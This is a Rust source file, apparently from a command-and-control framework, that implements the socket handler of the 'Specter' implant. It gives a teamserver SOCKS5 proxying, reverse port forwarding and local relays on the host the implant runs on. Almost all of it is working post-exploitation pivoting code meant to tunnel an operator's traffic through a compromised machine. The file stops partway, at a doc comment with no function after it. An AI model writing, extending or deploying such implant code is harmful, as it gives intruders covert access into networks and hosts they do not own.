//! Socket state management for SOCKS5 proxy and reverse port forwarding.
//!
//! This module implements the `CommandSocket` (ID 2540) handler for the Specter
//! agent. The wire protocol is identical to Phantom's implementation — all
//! response payloads use big-endian encoding, matching the teamserver's
//! socket callback parser.

use std::collections::HashMap;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};

use red_cell_common::demon::{DemonCommand, DemonSocketCommand, DemonSocketType};
use tokio::net::TcpStream as TokioTcpStream;
use tracing::{info, warn};

use crate::dispatch::Response;

// ─── SOCKS5 protocol constants ──────────────────────────────────────────────

const SOCKS_VERSION: u8 = 5;
const SOCKS_METHOD_NO_AUTH: u8 = 0;
const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
const SOCKS_COMMAND_CONNECT: u8 = 1;
const SOCKS_REPLY_SUCCEEDED: u8 = 0;
const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;

// ─── State structs ──────────────────────────────────────────────────────────

/// All socket-related state for the Specter agent.
#[derive(Debug, Default)]
pub struct SocketState {
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    socks_proxies: HashMap<u32, SocksProxy>,
    sockets: HashMap<u32, ManagedSocket>,
    local_relays: HashMap<u32, LocalRelayConnection>,
    socks_clients: HashMap<u32, SocksClient>,
    pending_responses: Vec<PendingSocketResponse>,
}

/// A pending response to be sent back to the teamserver.
#[derive(Debug, Clone)]
struct PendingSocketResponse {
    request_id: u32,
    payload: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReversePortForwardMode {
    Teamserver,
    Local,
}

#[derive(Debug)]
struct SocksProxy {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct LocalRelayConnection {
    left: TcpStream,
    right: TcpStream,
    parent_id: u32,
}

#[derive(Debug)]
struct SocksClient {
    stream: TcpStream,
    server_id: u32,
    state: SocksClientState,
}

#[derive(Debug)]
enum SocksClientState {
    Greeting { buffer: Vec<u8> },
    Request { buffer: Vec<u8> },
    Relay { target: TcpStream },
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SocksConnectRequest {
    atyp: u8,
    address: Vec<u8>,
    port: u16,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SocksRequestError {
    GeneralFailure,
    CommandNotSupported,
    AddressTypeNotSupported,
}

// ─── SocketState implementation ─────────────────────────────────────────────

impl SocketState {
    /// Create a new empty socket state.
    pub fn new() -> Self {
        Self::default()
    }

    /// Handle an incoming `CommandSocket` task from the teamserver.
    ///
    /// Parses the subcommand and dispatches to the appropriate handler.
    /// Some subcommands (like `Connect`) require async I/O, so this method
    /// is async.
    pub async fn handle_command(
        &mut self,
        request_id: u32,
        payload: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let subcommand_raw = parse_u32_le(payload, &mut offset)?;
        let subcommand = DemonSocketCommand::try_from(subcommand_raw)
            .map_err(|_| SocketError::Parse("unknown socket subcommand"))?;

        let rest = &payload[offset..];

        match subcommand {
            DemonSocketCommand::ReversePortForwardAdd => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Teamserver)?;
            }
            DemonSocketCommand::ReversePortForwardAddLocal => {
                self.handle_rportfwd_add(request_id, rest, ReversePortForwardMode::Local)?;
            }
            DemonSocketCommand::ReversePortForwardList => {
                self.handle_rportfwd_list(request_id);
            }
            DemonSocketCommand::ReversePortForwardClear => {
                self.handle_rportfwd_clear(request_id);
            }
            DemonSocketCommand::ReversePortForwardRemove => {
                self.handle_rportfwd_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyAdd => {
                self.handle_socks_proxy_add(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyList => {
                self.handle_socks_proxy_list(request_id);
            }
            DemonSocketCommand::SocksProxyRemove => {
                self.handle_socks_proxy_remove(request_id, rest)?;
            }
            DemonSocketCommand::SocksProxyClear => {
                self.handle_socks_proxy_clear(request_id);
            }
            DemonSocketCommand::Open => {
                warn!("socket open is a callback-only path — ignoring");
            }
            DemonSocketCommand::Read => {
                self.handle_socket_read(request_id, rest)?;
            }
            DemonSocketCommand::Write => {
                self.handle_socket_write(request_id, rest)?;
            }
            DemonSocketCommand::Close => {
                self.handle_socket_close(rest)?;
            }
            DemonSocketCommand::Connect => {
                self.handle_socket_connect(request_id, rest).await?;
            }
        }

        Ok(())
    }

    /// Poll all active sockets, listeners, and relays for pending I/O.
    ///
    /// Must be called periodically from the agent run loop. Returns any
    /// responses that need to be sent to the teamserver.
    pub async fn poll(&mut self) -> Result<(), SocketError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets()?;
        self.poll_local_relays();
        self.poll_socks_clients().await?;
        Ok(())
    }

    /// Drain all pending responses queued during `handle_command()` and `poll()`.
    pub fn drain_responses(&mut self) -> Vec<Response> {
        self.pending_responses
            .drain(..)
            .map(|r| Response {
                command_id: u32::from(DemonCommand::CommandSocket),
                request_id: r.request_id,
                payload: r.payload,
            })
            .collect()
    }

    /// Returns `true` if there are active sockets, listeners, or relays that
    /// need periodic polling.
    pub fn has_active_connections(&self) -> bool {
        !self.reverse_port_forwards.is_empty()
            || !self.socks_proxies.is_empty()
            || !self.sockets.is_empty()
            || !self.local_relays.is_empty()
            || !self.socks_clients.is_empty()
    }

    // ─── Reverse port forward handlers ──────────────────────────────────────

    fn handle_rportfwd_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
        mode: ReversePortForwardMode,
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;
        let forward_addr = parse_u32_le(rest, &mut offset)?;
        let forward_port = parse_u32_le(rest, &mut offset)?;

        let command = match mode {
            ReversePortForwardMode::Teamserver => DemonSocketCommand::ReversePortForwardAdd,
            ReversePortForwardMode::Local => DemonSocketCommand::ReversePortForwardAddLocal,
        };

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_port_forward_add(
                            command,
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(
                    listener_id,
                    bind_addr, bound_port, forward_addr, forward_port, "rportfwd added"
                );
                self.reverse_port_forwards.insert(
                    listener_id,
                    ReversePortForward {
                        listener,
                        mode,
                        bind_addr,
                        bind_port: bound_port,
                        forward_addr,
                        forward_port,
                    },
                );
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        true,
                        listener_id,
                        bind_addr,
                        bound_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind rportfwd listener");
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        false,
                        0,
                        bind_addr,
                        bind_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
        }

        Ok(())
    }

    fn handle_rportfwd_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
        for (socket_id, listener) in &self.reverse_port_forwards {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(listener.bind_addr));
            payload.extend_from_slice(&encode_u32(listener.bind_port));
            payload.extend_from_slice(&encode_u32(listener.forward_addr));
            payload.extend_from_slice(&encode_u32(listener.forward_port));
        }
        self.queue_response(request_id, payload);
    }

    fn handle_rportfwd_clear(&mut self, request_id: u32) {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        for listener_id in listener_ids {
            self.remove_reverse_port_forward(listener_id);
        }
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(id, s)| (s.socket_type == DemonSocketType::Client).then_some(*id))
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }
        self.queue_response(request_id, encode_socket_clear(true));
    }

    fn handle_rportfwd_remove(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.reverse_port_forwards.contains_key(&socket_id) {
            let callbacks_before = self.pending_responses.len();
            self.remove_reverse_port_forward(socket_id);
            // Overwrite the request_id on the callback generated by remove_reverse_port_forward
            if let Some(resp) = self.pending_responses.get_mut(callbacks_before) {
                resp.request_id = request_id;
            }
        }
        Ok(())
    }

    // ─── SOCKS proxy handlers ───────────────────────────────────────────────

    fn handle_socks_proxy_add(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set socks listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(listener_id, bind_addr, bound_port, "socks proxy added");
                self.socks_proxies
                    .insert(listener_id, SocksProxy { listener, bind_addr, bind_port: bound_port });
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind socks proxy");
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                );
            }
        }

        Ok(())
    }

    fn handle_socks_proxy_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
        for (socket_id, proxy) in &self.socks_proxies {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(proxy.bind_addr));
            payload.extend_from_slice(&encode_u32(proxy.bind_port));
        }
        self.queue_response(request_id, payload);
    }

    fn handle_socks_proxy_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.socks_proxies.remove(&socket_id).is_some() {
            let client_ids: Vec<u32> = self
                .socks_clients
                .iter()
                .filter_map(|(id, c)| (c.server_id == socket_id).then_some(*id))
                .collect();
            for client_id in client_ids {
                self.socks_clients.remove(&client_id);
            }
            self.queue_response(request_id, encode_socks_proxy_remove(socket_id));
        }
        Ok(())
    }

    fn handle_socks_proxy_clear(&mut self, request_id: u32) {
        self.socks_proxies.clear();
        self.socks_clients.clear();
        self.queue_response(request_id, encode_socks_proxy_clear(true));
    }

    // ─── Socket I/O handlers ────────────────────────────────────────────────

    fn handle_socket_read(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let socket_type_raw = parse_u32_le(rest, &mut offset)?;
        let socket_type = DemonSocketType::try_from(socket_type_raw)
            .map_err(|_| SocketError::Parse("unknown socket type"))?;
        let success = parse_u32_le(rest, &mut offset)? != 0;

        if success {
            let data = parse_bytes_le(rest, &mut offset)?;
            self.write_to_socket(request_id, socket_id, socket_type, &data)?;
        } else {
            let error_code = parse_u32_le(rest, &mut offset)?;
            warn!(socket_id, error_code, "socket read failed (from server)");
        }

        Ok(())
    }

    fn handle_socket_write(&mut self, request_id: u32, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let data = parse_bytes_le(rest, &mut offset)?;

        let mut write_failure = None;
        if let Some(socket) = self.sockets.get_mut(&socket_id) {
            if let Err(error) = write_all_nonblocking(&mut socket.stream, &data) {
                write_failure = Some((socket.socket_type, raw_socket_error(&error)));
            }
        }
        if let Some((socket_type, error_code)) = write_failure {
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn handle_socket_close(&mut self, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        self.remove_socket(socket_id);
        Ok(())
    }

    async fn handle_socket_connect(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;

        // atyp is a single byte
        if rest.len() <= offset {
            return Err(SocketError::Parse("buffer too short for atyp"));
        }
        let atyp = rest[offset];
        offset += 1;

        let host = parse_bytes_le(rest, &mut offset)?;

        // port is i16 LE
        if rest.len() < offset + 2 {
            return Err(SocketError::Parse("buffer too short for port"));
        }
        let port_bytes: [u8; 2] = rest[offset..offset + 2]
            .try_into()
            .map_err(|_| SocketError::Parse("port conversion failed"))?;
        let port = u16::from_le_bytes(port_bytes);

        match connect_socks_target(atyp, &host, port).await {
            Ok(stream) => {
                self.sockets.insert(
                    socket_id,
                    ManagedSocket {
                        stream,
                        socket_type: DemonSocketType::ReverseProxy,
                        bind_addr: 0,
                        bind_port: u32::from(port),
                        forward_addr: 0,
                        forward_port: 0,
                    },
                );
                self.queue_response(request_id, encode_socket_connect(true, socket_id, 0));
            }
            Err(error_code) => {
                self.queue_response(
                    request_id,
                    encode_socket_connect(false, socket_id, error_code),
                );
            }
        }

        Ok(())
    }

    // ─── Internal helpers ───────────────────────────────────────────────────

    fn write_to_socket(
        &mut self,
        request_id: u32,
        socket_id: u32,
        expected_type: DemonSocketType,
        data: &[u8],
    ) -> Result<(), SocketError> {
        let Some(socket) = self.sockets.get_mut(&socket_id) else {
            warn!(socket_id, "socket not found for write");
            return Ok(());
        };

        let socket_type = socket.socket_type;
        if socket_type != expected_type {
            warn!(socket_id, ?socket_type, ?expected_type, "socket type mismatch");
            return Ok(());
        }

        if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
            let error_code = raw_socket_error(&error);
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn queue_response(&mut self, request_id: u32, payload: Vec<u8>) {
        self.pending_responses.push(PendingSocketResponse { request_id, payload });
    }

    fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_response(0, payload);
    }

    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        // Remove all client sockets associated with this listener.
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        // Remove all local relays associated with this listener.
        let relay_ids: Vec<u32> = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_response(
            0,
            encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        );
    }

    // ─── Polling helpers ────────────────────────────────────────────────────

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), SocketError> {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_response(
                        0,
                        encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), SocketError> {
        let server_ids: Vec<u32> = self.socks_proxies.keys().copied().collect();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream.set_nonblocking(true).map_err(|e| SocketError::Io(e.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                    Err(e) => return Err(SocketError::Io(e.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    fn poll_sockets(&mut self) -> Result<(), SocketError> {
        let socket_ids: Vec<u32> = self.sockets.keys().copied().collect();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(e) if e.kind() == ErrorKind::WouldBlock => break,
                        Err(e) => {
                            read_failure = Some(encode_socket_read_failure(
                                socket_id,
                                socket.socket_type,
                                raw_socket_error(&e),
                            ));
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    match encode_socket_read_success(socket_id, socket.socket_type, &data) {
                        Ok(payload) => read_success = Some(payload),
                        Err(e) => {
                            warn!(socket_id, error = %e, "failed to encode socket read success");
                            removals.push(socket_id);
                        }
                    }
                }
            }

            if let Some(payload) = read_failure {
                self.queue_response(0, payload);
            }
            if let Some(payload) = read_success {
                self.queue_response(0, payload);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) {
        let relay_ids: Vec<u32> = self.local_relays.keys().copied().collect();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }
    }

    async fn poll_socks_clients(&mut self) -> Result<(), SocketError> {
        let client_ids: Vec<u32> = self.socks_clients.keys().copied().collect();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            if write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .is_err()
                            {
                                removals.push(client_id);
                                continue;
                            }
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    if send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )
                                    .is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    if !remainder.is_empty()
                                        && write_all_nonblocking(&mut target, &remainder).is_err()
                                    {
                                        removals.push(client_id);
                                        continue;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    let _ = send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    );
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }
}

// ─── Error type ─────────────────────────────────────────────────────────────

/// Errors that can occur during socket operations.
#[derive(Debug, thiserror::Error)]
pub enum SocketError {
    /// A parse error occurred reading the task payload.
    #[error("socket parse error: {0}")]
    Parse(&'static str),

    /// An I/O error occurred on a socket operation.
    #[error("socket I/O error: {0}")]
    Io(String),
}

// ─── Free functions ─────────────────────────────────────────────────────────

/// Connect to a target via SOCKS5 address type.
async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments: Vec<u16> = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream = TokioTcpStream::connect(&target).await.map_err(|e| raw_socket_error(&e))?;
    let stream = stream.into_std().map_err(|e| raw_socket_error(&e))?;
    stream.set_nonblocking(true).map_err(|e| raw_socket_error(&e))?;
    Ok(stream)
}

/// Connect to an IPv4 target by u32 address and port.
async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
    let octets = Ipv4Addr::from(addr).octets();
    connect_socks_target(1, &octets, port).await
}

/// Read all available data from a non-blocking stream.
fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, SocketError> {
    let mut chunk = [0_u8; 4096];
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => return Ok(true),
            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
            Err(e) if e.kind() == ErrorKind::WouldBlock => return Ok(false),
            Err(e) if e.kind() == ErrorKind::Interrupted => continue,
            Err(e) => return Err(SocketError::Io(e.to_string())),
        }
    }
}

/// Pump data from source to sink. Returns `true` if the connection is closed.
fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
    let mut buffer = [0_u8; 4096];
    loop {
        match source.read(&mut buffer) {
            Ok(0) => return true,
            Ok(read) => {
                if write_all_nonblocking(sink, &buffer[..read]).is_err() {
                    return true;
                }
            }
            Err(e) if e.kind() == ErrorKind::WouldBlock => return false,
            Err(e) if e.kind() == ErrorKind::Interrupted => continue,
            Err(_) => return true,
        }
    }
}

/// Write all data to a non-blocking stream, retrying on EINTR.
fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(e) if e.kind() == ErrorKind::Interrupted => continue,
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

/// Try to parse a SOCKS5 greeting from the buffer.
fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
    if buffer.len() < 2 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    let total = 2 + usize::from(buffer[1]);
    if buffer.len() < total {
        return None;
    }
    if !buffer[2..total].contains(&SOCKS_METHOD_NO_AUTH) {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    Some(Ok(total))
}

/// Try to parse a SOCKS5 request from the buffer.
fn try_parse_socks_request(
    buffer: &[u8],
) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
    if buffer.len() < 4 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SocksRequestError::GeneralFailure));
    }
    if buffer[1] != SOCKS_COMMAND_CONNECT {
        return Some(Err(SocksRequestError::CommandNotSupported));
    }

    let atyp = buffer[3];
    let address_len = match atyp {
        1 => 4,
        3 => {
            if buffer.len() < 5 {
                return None;
            }
            usize::from(buffer[4]) + 1
        }
        4 => 16,
        _ => return Some(Err(SocksRequestError::AddressTypeNotSupported)),
    };

    let header_len = 4 + address_len;
    if buffer.len() < header_len + 2 {
        return None;
    }

    let address = match atyp {
        3 => buffer[5..header_len].to_vec(),
        _ => buffer[4..header_len].to_vec(),
    };
    let port = u16::from_be_bytes([buffer[header_len], buffer[header_len + 1]]);
    Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
}

/// Send a SOCKS5 reply to a client stream.
fn send_socks_reply(
    stream: &mut TcpStream,
    reply: u8,
    atyp: u8,
    address: &[u8],
    port: u16,
) -> Result<(), SocketError> {
    let mut response = vec![SOCKS_VERSION, reply, 0, atyp];
    match atyp {
        3 => {
            let length = u8::try_from(address.len())
                .map_err(|_| SocketError::Parse("SOCKS domain too long"))?;
            response.push(length);
            response.extend_from_slice(address);
        }
        _ => response.extend_from_slice(address),
    }
    response.extend_from_slice(&port.to_be_bytes());
    write_all_nonblocking(stream, &response).map_err(|e| SocketError::Io(e.to_string()))
}

/// Extract the raw OS error code from an I/O error.
